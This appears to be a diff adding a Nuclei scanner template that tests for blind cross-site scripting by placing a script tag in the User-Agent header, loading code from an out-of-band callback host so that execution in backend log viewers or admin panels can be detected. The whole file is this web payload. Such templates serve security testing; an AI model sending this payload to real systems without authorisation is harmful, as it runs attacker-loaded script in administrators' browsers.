@@ -1,0 +1,22 @@
+id: blind-xss-user-agent
+info:
+  name: Blind XSS in User-Agent
+  author: WhiteFatalis
+  severity: high
+  description: Injects a blind XSS payload into the User-Agent header, targeting backend log viewers or admin panels.
+  tags: xss, blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      User-Agent: "\"><script src=//{{interactsh-url}}></script>"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Nuclei handles OOB interactions here
+        words:
+          - "http"
+          - "dns"
